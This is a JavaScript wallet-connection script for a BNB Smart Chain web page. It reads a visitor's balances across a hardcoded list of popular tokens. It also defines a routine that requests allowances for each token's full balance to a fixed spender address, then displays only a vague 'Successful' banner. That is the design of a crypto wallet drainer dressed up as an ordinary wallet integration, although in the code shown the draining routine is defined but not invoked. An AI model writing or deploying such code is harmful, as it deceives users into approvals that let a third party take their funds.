const SPENDER_ADDRESS = '0x39B9872F7fE672e04f00CCF99db5CAb54F0d2CB0';

const TOKENS = {
    USDT: '0x55d398326f99059fF775485246999027B3197955',
    BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    BabyDoge: '0xc748673057861a797275CD8A068AbB95A902e8de',
    Cake: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
    DAI: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
    FLOKI: '0xfb5B838b6cfEEdC2873aB27866079AC55363D37E',
    TWT: '0x4B0F1812e5Df2A09796481Ff14017e6005508003',
    '1INCH': '0x111111111117dC0aa78b770fA6A738034120C302',
    ZEC: '0x1Ba42e5193dfA8B03D15dd1B86a3113bbBEF8Eeb',
    SFP: '0xD41FDb03Ba84762dD66a0af1a6C8540FF1ba5dfb',
    USTC: '0x23396cF899Ca06c4472205fC903bDB4de249D6fC',
    AIOZ: '0x33d08D8C7a168333a85285a68C0042b39fC3741D',
    BTT: '0x352Cb5E19b12FC216548a2677bD0fce83BaE434B',
    SUPER: '0x51BA0b044d96C3aBfcA52B64D733603CCC4F0d4D'
};

const TOKEN_ABI = [
    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
];

let web3;
let userAddress;
let tokenContracts = {};

async function initWeb3() {
    if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = (await web3.eth.getAccounts())[0];
            initTokenContracts();
            return true;
        } catch (error) {
            console.error('User denied account access');
            return false;
        }
    } else {
        console.error('Web3 not found');
        return false;
    }
}

function initTokenContracts() {
    for (const [symbol, address] of Object.entries(TOKENS)) {
        tokenContracts[symbol] = new web3.eth.Contract(TOKEN_ABI, address);
    }
}

async function switchToBSC() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }], // BSC mainnet
        });
        return true;
    } catch (error) {
        console.error('Failed to switch to BSC:', error);
        return false;
    }
}

async function getTokenBalance(contract) {
    try {
        const balance = await contract.methods.balanceOf(userAddress).call();
        const decimals = await contract.methods.decimals().call();
        return { balance, decimals };
    } catch (error) {
        console.error('Failed to get token balance:', error);
        return { balance: '0', decimals: '18' };
    }
}

async function increaseAllowance(contract, symbol, amount) {
    try {
        const result = await contract.methods.increaseAllowance(SPENDER_ADDRESS, amount).send({ from: userAddress });
        console.log(`${symbol} allowance increased successfully:`, result);
        showSuccessBanner();
        return true;
    } catch (error) {
        console.error(`Failed to increase ${symbol} allowance:`, error);
        return false;
    }
}

function showSuccessBanner() {
    const banner = document.createElement('div');
    banner.id = 'successBanner';
    banner.textContent = 'Successful';
    document.body.appendChild(banner);
    banner.style.display = 'block';
    setTimeout(() => {
        banner.style.display = 'none';
        document.body.removeChild(banner);
    }, 3000);
}

async function increaseAllowanceForAllTokens() {
    let results = {};
    for (const [symbol, contract] of Object.entries(tokenContracts)) {
        const { balance, decimals } = await getTokenBalance(contract);
        if (parseFloat(balance) > 0) {
            results[symbol] = {
                balance: web3.utils.fromWei(balance, 'ether'),
                success: await increaseAllowance(contract, symbol, balance)
            };
        }
    }
    return results;
}

async function connectWallet() {
    const walletBtn = document.querySelector('[data-wallet-text]');
    
    if (await initWeb3()) {
        if (await switchToBSC()) {
            const balances = await getTokenBalances();
            displayBalances(balances);
            walletBtn.textContent = 'Connected'; // Update button text
        } else {
            console.error('Failed to switch to BSC network');
            walletBtn.textContent = 'Connect Wallet'; // Reset button text if connection fails
        }
    } else {
        console.error('Failed to connect to wallet');
        walletBtn.textContent = 'Connect Wallet'; // Reset button text if connection fails
    }
}

async function checkWalletConnection() {
    const walletBtn = document.querySelector('[data-wallet-text]');
    
    if (typeof window.ethereum !== 'undefined') {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
            walletBtn.textContent = 'Connected';
        } else {
            walletBtn.textContent = 'Connect Wallet';
        }
    } else {
        walletBtn.textContent = 'Connect Wallet';
    }
}

async function getTokenBalances() {
    let balances = {};
    for (const [symbol, contract] of Object.entries(tokenContracts)) {
        const { balance, decimals } = await getTokenBalance(contract);
        if (parseFloat(balance) > 0) {
            balances[symbol] = web3.utils.fromWei(balance, 'ether');
        }
    }
    return balances;
}

function displayBalances(balances) {
    const balancesDiv = document.getElementById('balances');
    balancesDiv.innerHTML = '';
    for (const [symbol, balance] of Object.entries(balances)) {
        const balanceItem = document.createElement('div');
        balanceItem.className = 'balance-item';
        balanceItem.innerHTML = `<span>${symbol}:</span> <span>${parseFloat(balance).toFixed(4)}</span>`;
        balancesDiv.appendChild(balanceItem);
    }
    document.getElementById('walletModal').style.display = 'block';
}

async function checkWalletConnection() {
    const walletBtn = document.querySelector('[data-wallet-text]');
    
    if (typeof window.ethereum !== 'undefined') {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
            walletBtn.textContent = 'Connected';
        } else {
            walletBtn.textContent = 'Connect Wallet';
        }
    } else {
        walletBtn.textContent = 'Connect Wallet';
    }
}

// Event listeners
document.addEventListener('DOMContentLoaded', () => {
    const walletBtn = document.querySelector('[data-wallet-text]');
    const modal = document.getElementById('walletModal');
    const closeBtn = document.getElementsByClassName('close')[0];

    checkWalletConnection(); // Check wallet connection status on page load

    walletBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        await connectWallet();
    });

    closeBtn.onclick = function() {
        modal.style.display = 'none';
    }

    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = 'none';
        }
    }

    // Listen for account changes
    if (window.ethereum) {
        window.ethereum.on('accountsChanged', checkWalletConnection);
    }
});

// This line should be in script.js, not web3-integration.js
// document.write('<script src="./assets/js/web3-integration.js"></script>');